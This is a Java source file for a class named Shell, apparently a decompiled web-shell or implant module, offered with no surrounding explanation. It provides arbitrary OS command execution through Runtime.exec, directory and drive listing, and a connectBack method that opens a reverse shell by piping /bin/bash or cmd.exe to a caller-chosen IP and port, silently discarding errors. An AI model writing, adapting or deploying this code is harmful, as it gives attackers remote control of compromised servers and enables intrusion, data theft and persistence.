
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.Date;

public class Shell {
    public Shell() {
    }

    public static String run(String methodName, String params, String encoding) {
        String result = "";
        if (methodName.equalsIgnoreCase("exec")) {
            result = exec(params, encoding);
        } else if (methodName.equalsIgnoreCase("list")) {
            result = list(params, encoding);
        } else if (methodName.equalsIgnoreCase("getCurrentDir")) {
            result = getCurrentDir();
        } else if (methodName.equalsIgnoreCase("connectBack")) {
            String ip = params.substring(0, params.indexOf("^"));
            String port = params.substring(params.indexOf("^") + 1);
            result = connectBack(ip, Integer.parseInt(port));
        } else {
            result = "unkown methodName";
        }

        return result;
    }

    public static String exec(String cmd, String encoding) {
        String result = "";
        if (encoding == null || encoding.equals("")) {
            encoding = "utf-8";
        }

        try {
            Process p = Runtime.getRuntime().exec(cmd);

            try {
                p.waitFor();
            } catch (InterruptedException var8) {
                result = result + var8.getMessage();
                var8.printStackTrace();
            }

            InputStream fis;
            if (p.exitValue() == 0) {
                fis = p.getInputStream();
            } else {
                fis = p.getErrorStream();
            }

            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);

            for(String line = null; (line = br.readLine()) != null; result = result + line + "\n") {
            }
        } catch (IOException var9) {
            result = result + var9.getMessage();
        }

        return result;
    }

    public static String list(String path, String encoding) {
        String result = "";
        if (encoding == null || encoding.equals("")) {
            encoding = "utf-8";
        }
        File file = new File(path);
        File[] items = file.listFiles();
        for(int i = 0; i < items.length; ++i) {
            File item = items[i];
            String type = item.isDirectory() ? "<DIR>" : "";
            String size = item.isDirectory() ? "" : item.length() / 1024L + "KB";
            if (size.equals("0KB")) {
                size = item.length() + "Byte";
            }
            String date = (new Date(item.lastModified())).toLocaleString();
            date = date.replace(" ","");
            result = result + date + " " + type + size + " " + item.getName() + "\n";
            result = result.replace("  "," ");
            result = result.replace("  "," ");
        }
        return result;
    }

    public static String getCurrentDir() {
        String result = "";
        File directory = new File("");

        try {
            result = directory.getAbsolutePath();
        } catch (Exception var3) {
        }

        return result;
    }

    public static String connectBack(String ip, int port) {
        try {
            String ShellPath;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                ShellPath = new String("/bin/bash");
            } else {
                ShellPath = new String("cmd.exe");
            }

            Socket socket = new Socket(ip, port);
            Process process = Runtime.getRuntime().exec(ShellPath);

            class StreamConnector extends Thread {
                InputStream sp;
                OutputStream gh;

                StreamConnector(InputStream sp, OutputStream gh) {
                    this.sp = sp;
                    this.gh = gh;
                }

                public void run() {
                    BufferedReader xp = null;
                    BufferedWriter ydg = null;

                    try {
                        xp = new BufferedReader(new InputStreamReader(this.sp));
                        ydg = new BufferedWriter(new OutputStreamWriter(this.gh));
                        char[] buffer = new char[8192];

                        int length;
                        while((length = xp.read(buffer, 0, buffer.length)) > 0) {
                            ydg.write(buffer, 0, length);
                            ydg.flush();
                        }
                    } catch (Exception var6) {
                    }

                    try {
                        if (xp != null) {
                            xp.close();
                        }

                        if (ydg != null) {
                            ydg.close();
                        }
                    } catch (Exception var5) {
                    }

                }
            }

            (new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
            (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
        } catch (Exception var5) {
        }

        return "^OK^";
    }

    public static String getDriveList() {
        String result = "";
        File[] roots = File.listRoots();

        for(int i = 0; i < roots.length; ++i) {
            result = result + roots[i].getAbsolutePath() + "^";
        }

        return result;
    }
}
